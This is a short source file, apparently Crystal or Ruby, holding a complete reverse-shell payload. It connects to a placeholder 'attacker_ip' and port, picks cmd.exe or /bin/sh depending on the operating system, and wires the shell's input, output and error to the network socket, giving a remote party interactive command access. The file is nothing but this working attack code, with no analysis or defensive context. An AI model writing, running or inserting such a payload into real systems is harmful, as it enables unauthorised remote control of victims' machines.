require "socket"

ip = "attacker_ip"

port = attacker_port

socket = TCPSocket.new(ip, port)

shell = (system("uname").chomp == "Windows_NT") ? "cmd.exe": "/bin/sh"

Process.run(shell, input: socket, output: socket, error: socket)
